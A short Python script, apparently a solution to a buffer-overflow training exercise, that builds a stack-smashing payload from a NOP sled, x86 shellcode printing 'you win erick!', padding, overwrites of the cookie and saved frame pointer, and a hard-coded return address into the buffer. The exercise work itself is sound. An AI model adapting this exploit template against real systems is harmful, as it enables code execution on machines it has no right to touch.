# payload.py
from struct import pack
# shellcode, imprime you win!
shellcode ="\xeb\x11\x59\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x0e\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xea\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x20\x65\x72\x69\x63\x6b\x21"
ret_addr = 0xbffff5ac # Direccion de buf
output = "\x90" * 20 # nops iniciales buf
output += shellcode # shellcode
output += "A" * (80 - 20 - len(shellcode)) # padding hasta fin de buf
output += "BBBB" # lleno cookie
output += "CCCC" # lleno ebp
output += pack("<I", ret_addr) # defino return address
print(output)